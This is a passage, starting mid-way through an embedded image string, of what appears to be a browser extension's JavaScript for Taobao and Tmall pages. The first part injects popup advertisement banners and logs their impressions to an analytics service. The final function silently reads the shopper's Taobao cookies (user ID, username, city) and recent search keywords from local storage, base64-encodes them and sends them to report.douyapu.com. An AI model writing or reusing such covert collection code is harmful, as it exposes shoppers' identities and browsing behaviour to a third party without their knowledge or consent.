DxGczZTihCcu6vGk9P6m2eNY1hh+HVlnetl66N9bo35Pr/UY/oAf21Oghi/6TMUzRhioROo8qIwmEFqqrsWhtMO2QitaHjdGsGgkRdIRVkFUVRCJBkrVQmlbdWxtVzVLY1TGgRm2Q6NgUu0GQft5QUVu8j2mgv0JbCeClGCpnV7DzcRzoGS3nrCt04TN3Qlbk02V6bk7iHgAPz12WtXqHaTJ0cclg7oFzZheHW8xaF6buB5/av2kkZ+Yr571WElgTaqxgU26iWiwpB2TUWQUEN0yr9aUYJLN3F0SMbz9F8nlymlwihg8+SPzI6u7hL+LVCaXzREk2mU3XGipuszVlny2smk6ZkgFrJHWeZ/chBaGxfLR+Za+0G894ej+Rr4jmrkgYcnBNBdc5fSJH/gs7vbYbEMacHZx7k9TVcAJkjSSziolgsnHnSiaIFaY1dCZLANQ2AXdo26E8GUBouLFM7+1WdmSGTGqIsH5CfPI+qnVm74JOYMzbAQYSZzULo/CUmVtI6ngpRrmRLe3lWy91W7daUuDLUoMJfgu+RAdWlhTTsu37vQ5lzOv9EXzdUpDbtqeypz0sY9z3Er4PTUm1BphK+JXQ3F9YwjTY7x53xzLYm7/F9+qFGL89r97x8vgH/qh/Le/sdeQGgQCcyyUh3QGJdVecKCgizUhIgY6p7h0iKNMtNEjWsbXp/dbBm938S3EUR4qTT2bH9rrwpxkQxivtjvinNd7sgTVTwx3w3xTV7vhfNETfxNdz7s91+fW5DdhaQ1pjLJcJrRuVTcHTSMyPSo2SlFGSjU5Ir2yQQUlyXpnRsw3YWqPmOXpqrXJrdFRjwmbGBNmoOU6VCzSjMzEbD1BmQqiQ/sDfkQvxmxp6nnNIbS6BktbK1lTQIs5W6Zhj10DFbIXCGxJ4BRk3y4Y0LZ+J43frfELI3tb2DZwqctIaPAEUk3Q0OOqSk4emm/egvORVK2ZIFR5Mhq00RHp42bm/XT4Hx6S0U5DMZyUYJDmqXMewUsNhMRgskmRkEW2gYqxPPkmZTMJgAE0wfc9TIHSEUBTbCH16K27nk8woDcy3GggfrcHH2R4AUQ98ncZ57fbyJCy/PN358oB93DqbaTxMU+M4TceuIQjyex3VcCSgoSmNUKC69SPVCTR2JRtm4/YwZI7DcL9oBJ3G/DjGozqkKfJkjnMiuUpDWLREtje00v0MKZdr7Cg2K6rHacrZ4u2iweqEhyTUY2h6it7gcTZ2nQZDq8jmSJRIMCkvFbSEU5SXUcP3PaoQmBhpK43bIdZ2OIT2ctEQYbjPbtHgYYpCyAOkwlZrFH0cYkokC0S0tWEoqYBGi1ACGiBTUQVNwjRrchBhM40hTlOlwKeHriExVxu1VQcv1AAecWh54Ks1MPbLbSLX5lnDMGkyqc2HObaplUx1zA2QE3ctCGFgQ415+dFW9sqTnoJUgQk2jk45NhKXIYQxhNVFha1bDJSIaz2BGqbqBG/5MEPTGdsIvMYITDCuHRO0pcY03b9vNN9PyUnJBKHwqQfFoCqBJGxvKzVStdTuH4dMDiCjbRG8cBDnShEaQmkWS4zLwAfofEsbajw0QDj0jDwMxTEGmYfCRLJMR8VbZWP2q/tG7ckoJh8TC75/HfjSsZ3r0UnPHe8tBM46HGLUmm+lIaDf/8PLjxy98DGSj8QsyRIYxehdkT/UkN9pGENYrFIK19wcd8wGUhtlw+fjhYM5LTw75v0yPjrG+sESV2bDw5kKZi2SbYT0F/ivTdQd598YSn7Br4OzP8V6Dbnzp9izxpIO7uRuTc4alxpyO1U5a5zzsVuXt13j2aVXf2JvGuKma1z/jW8sfom7RePFa7ZvXt8sGk+vd+0h7haL6ydXL27u3rGdIl6/PVk8fXJ19fzm5u3d6z1y1yVOFldPrrrHq5sd86pbdI3O0+v9ily/WAw+ANe77jFeSNbHAAAAAElFTkSuQmCC",
                        "frequency":5,
                        "position":"2",
                        "begin_time":"2018-04-19T16:04:09.000Z",
                        "end_time":"2018-06-20T15:06:00.000Z",
                        "plant":"item.taobao.com|detail.tmall.com",
                        "unqiue":"e76ff4375159de551eedbf1c8454400e",
                        "status":1,
                        "sort":20
                    },
                ];      //右下角弹窗模块4
                total = dypAlert.length;
                $.each(dypAlert,function (v,k) {
                    n++;
                    if (k.position.match('2')) {
                        start1(k,n);
                    }
                });
            });
            function start1(k,n) {
                var urlOk = 0;
                var keyOK = 0;
                var urlArr = k.plant.split('|');
                var keyArr = k.keys ? k.keys.split('|') : [];
                $.each(urlArr,function (v,k) {
                    if (locHost == k) {
                        urlOk = 1;
                        return false;
                    }
                });
                if (keyArr.length) {
                    $.each(keyArr,function (v,k) {
                        if (sj_title.match(k)) {
                            keyOK = 1;
                            return false;
                        }
                    });
                } else {
                    keyOK = 1
                }
                if (urlOk && keyOK) {
                    cnzzAppend(function () {});
                    if (document.cookie.indexOf(`mgTqAlert${n}=1`) == -1) {
                        var curDate = new Date();
                        var curTamp = curDate.getTime();
                        var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
                        var passedTamp = curTamp - curWeeHours;
                        var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
                        var leftTime = new Date();
                        leftTime.setTime(leftTamp + curTamp);
                        document.cookie = `mgTqAlert${n}=1;expires=` + leftTime;
                        var typeimg = '',toUrl = '';
                        $("<style></style>").html(`#plug625-alert${n}{z-index:999999999999;position:fixed;bottom:10px;right:35px;display:none}#plug625-alert${n} img{display:block;max-width:300px;max-height:400px}#plug625-alert${n}-close{width:30px;height:30px;position:absolute;right:0;top:0;cursor:pointer;opacity:1;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAM1BMVEUAAAAAAABlZWUAAAD19fWioqIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///9IKCr6AAAAEHRSTlOAAJ919bt9Y0AsJghKSVdLz5TIOAAAAKNJREFUKM+F01kOwyAMBNBJpuyQ9P6nLVULiRUw8xXxZIXFxtYTi6O1dCVea42TJ3rok+RAiDDc+cQj58UHBjkaZwyTfxwwSfhy4oyZKntM4yu3YrOjZTf/8g2xr732x1dEgXChyHAQLrQiIVxoRQvh5q6wkmHeBoKpVRNO+7dD0XaeEbVzR2yc3xrbk4zv3K8fVG8HvZn0VtQbWR+D9RAtRvAD7KoEY4+OgCAAAAAASUVORK5CYII=)}#plug625-alert${n}-close:hover{opacity:.5}@keyframes mgslideInLeft{from{transform:translate3d(100%,0,0);visibility:visible}to{transform:translate3d(0,0,0)}}.mgslideInLeft{animation-name:mgslideInLeft}.mganimated{animation-duration:1s;animation-fill-mode:both}`).appendTo("head");
                        typeimg = k.img_src;
                        toUrl = k.link ? k.link : 'javascript:void(0);';
                        $(document).ready(function () {
                            $("body").after(`<div id="plug625-alert${n}" class="mganimated mgslideInLeft" data-name="${k.name}">
                                <a href="${toUrl}" target="_blank" rel="noreferrer"><img src='${typeimg}'></a>
                                <div id="plug625-alert${n}-close"></div>
                            </div>`);
                            if (k.link) {
                                $(`#plug625-alert${n} a`).attr("data-mgClick",k.name);
                            }
                            setTimeout(function () {
                                var swi = 0;
                                for (var i = 1; i < n; i++) {
                                    if ($(`#plug625-alert${i}`).length) {
                                        swi = 1;
                                        break;
                                    }
                                }
                                if (!swi) {
                                    $(`#plug625-alert${n}`).show();
                                    cnzzEvent(`${k.name}`,"弹出");
                                }
                                $(`#plug625-alert${n}-close`).click(function () {
                                    cnzzEvent(`${k.name}关闭`,"点击");
                                    var that = $(this);
                                    that.parent().fadeOut(1000,function () {
                                        that.parent().remove();
                                    });
                                });
                                var swi1 = 0;
                                var nextNum = "";
                                for (var j = n + 1; j < total + 1; j++) {
                                    if ($(`#plug625-alert${j}`).length) {
                                        swi1 = 1;
                                        nextNum = j;
                                        break;
                                    }
                                }
                                if (swi1) {
                                    $(`#plug625-alert${n}-close`).click(function () {
                                        setTimeout(function () {
                                            $(`#plug625-alert${nextNum}`).show();
                                            cnzzEvent(`${$(`#plug625-alert${nextNum}`).data("name")}`,"弹出");
                                        },2500);
                                    });
                                }
                            },1000 * n);
                        });
                    }
                }
            }
        }();
    }     //全网其他业务页面
    function startUseInfo() {
        calcTime('mgTqInfo',firstStart);
        function firstStart() {
            var info = {
                useId:'',       //用户ID
                useName:'',     //用户名字
                city:'',        //用户城市
                useKeys:'',     //用户关键字
                source:1        //用户平台
            };  //
            var needNum = 6;    //入库关键字个数
            function getUseInfo() {
                var storageData = localStorage;
                var n = 0;  //
                function count() {
                    n++;
                    if (n != 3) {
                        return
                    }
                    chrome.storage.local.get(null,function (e) {
                        info.useId = info.useId ? info.useId : e.useInfo1876 ? e.useInfo1876.useId : "";
                        info.useName = info.useName ? info.useName : e.useInfo1876 ? e.useInfo1876.useName : "";
                        info.city = info.city ? info.city : e.useInfo1876 ? e.useInfo1876.city : "";
                        if (info.useId && info.useName) {
                            chrome.storage.local.set({useInfo1876:{useId:info.useId,useName:info.useName,city:info.city}});
                            getKey();
                        }
                    });
                }   //
                function getKey() {
                    function getStorage(val) {
                        var keyword = [];
                        $.each(storageData,function (v,k) {
                            if (v == val) {
                                var index = 0;
                                $.each(JSON.parse(k),function (v,k) {
                                    index++;
                                    if (index <= needNum) {
                                        keyword.push(decodeURIComponent(k.key));
                                    }
                                });
                            }
                        });
                        return keyword.toString();
                    }   //
                    info.useKeys = getStorage(`suggest_history_historybaobei${info.useName}`) || getStorage(`suggest_history_historybaobei`);
                    postUseInfo();
                }   //获取keys
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"unb"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.useId = d[0].value;
                    }
                    count();
                });
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"lgc"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.useName = decodeURIComponent(d[0].value);
                        info.useName = unescape(info.useName.replace(/\\u/g,'%u'));
                    }
                    count();
                });
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"city"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.city = d[0].value;
                    }
                    count();
                });
            }   //获取用户数据
            function postUseInfo() {
                // console.log(info);
                if (info.useId && info.useName) {
                    var base64Post = '';
                    $.each(info,function (v,k) {
                        base64Post += `${Base64.encode(k)}|`
                    });
                    base64Post = base64Post.replace(/\|$/gi,"");
                    chrome.extension.sendMessage({
                        name:"universal",url:"http://report.douyapu.com/api/usr",data:{
                            action:'info',
                            data:base64Post
                        },
                    },function () {
                    });
                }
            }   //上报用户数据
            getUseInfo();
        }
    }    //淘宝首页用户信息上报
},1000);